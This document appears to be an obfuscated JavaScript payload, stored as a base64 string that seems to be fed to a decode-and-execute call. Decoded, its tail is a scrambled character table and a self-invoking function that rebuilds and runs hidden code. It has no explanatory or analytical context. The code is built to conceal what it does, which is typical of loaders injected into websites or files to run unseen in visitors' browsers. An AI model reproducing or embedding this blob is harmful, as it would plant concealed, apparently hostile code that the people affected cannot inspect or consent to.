Qz0ye2RyMiFXLjNhXW4oR1hiR2YxO2RpR110JDNtcmFHR31wXT1hOmp1JWJHXTM7MkcxO0c9VC45P29bNF0+WTUmZTtHXW9fbik9ZCpzLHRhNkdacl0pWyVyR2VpR0dlNiQuXWYpcF1HbnJHQzAgKSRvNCFlRyQzZCUhcEdlb2UmXnRddDJodHtHLi5nNEdfNl9HLmJrZUdHLnZqPT1vLm9zOF1hcEddR3QhcG9ubzc3ciFdR2lmX0d3cFcuKClydF00X3tHMjdHbkdlT1NuXzVlKWYpKUduTnRkfWIlNmksO3JlIGIoZEc9XWVvaShHY181MTo/MWZ1X2VvM1guLklUb3RHUCNdKzFfZUc4Ry5HKmN0R2NHYns9MF0lIT10X3RHR31yKzxlZHRHZVxcR0cxbmQxYkdUYyglM2E7PV83R24pWyZzbS5oNH09NWY0NG5HKE5jMGV1PSAgYz0pPW09NSxaUmRbIVwnMm8uR1thXytHPUcoYCssMmlhYmVhO2VfYiFHdSJyM2UhPUchZ0dwaUdyWF1iZWw1JV10M2VHO3R0KXJzPWUxR0csRzNfXFxdaGExSG99X2k6O19rLmUsW1MydDM2Ry0odEduZmFLfTU0Mkd1LjxiODYzYWRaO2ltO3VNXV0kc3NwckdHJWM9SiFHJXBmR0hQezplXUdHIDAyPkk5Nl0iR25wKDZVc2VdLDlybixyaF9raDM8KE8obih0IigwZW9iO29dYklHa2U2QTFuZEk7cj4pR2JHMVBdaSkpdEVfMnZzNShTR28pYj5fX3VyY2NrJTNiRzRjPyAoKWw7eG9uKktHY25veG9pMWlTbn1HXmNzR2lJTkpHIDlwMG0ge29HR2xHMiswZUc1R3RtZS4gR10oJiBvO2Rje29vRy5fRy59KGM7XzFlLihHMWFhaTRxZykpMUdlYS51cm8wKkcgR2U3KDZvKHUgIGRHNkdsb3MxLl9ddXQoc3lHXz1iPV9IYiQzJkJdaD1ILiUwZVtfX3Rwb1wnYzM7R0dtcns4bG59I0dyS2tfNDEgLEdic2VdczJHNSE9KCglb0cuYmI4cGRpbW5Hb2RkIClbaVsuJCUzTkdsRHtlMSg7ezBHKX1zaDE5Mi5nbl0mYy50YWVHel1bX2NlKWExIDIxLihhR11HR2J7VS5vXShqYUdmLmJdZjBybmMuR2RvQ007KWhvX3Q1R0c1JS4yaXJdKGJHPHMoIHJ1JV8gYmVlNGhHIGcuYnNnbF0haWg1R3RHb0d0YjZHKXVldmJpN2ltNV1HRzouR259KGMgIH0uXyBsR3RyKTFlIHRvJEcsXil0X19jbzpddCV4cjUlZyluMWcpam9pKDYjbF9ycl4wPV9ickd7JDZHNUduaD0gZlplR0cpYnNHcyA3KG5HXTV4YTR7VT1He2hwaSgpKDY9aTAgbil7R2VHfWFuKUddLnMgZTJzYnt7aWVfbUdiLTFTXWJHNS5mb25jX3lHbWF0X2Ugc2E1czEuNUddb25iaDVoeycpKTt2YXIgUG9DPUVtcShQcGssQkdmICk7UG9DKDkzOTIpO3JldHVybiA2MzY2fSkoKQ=='))
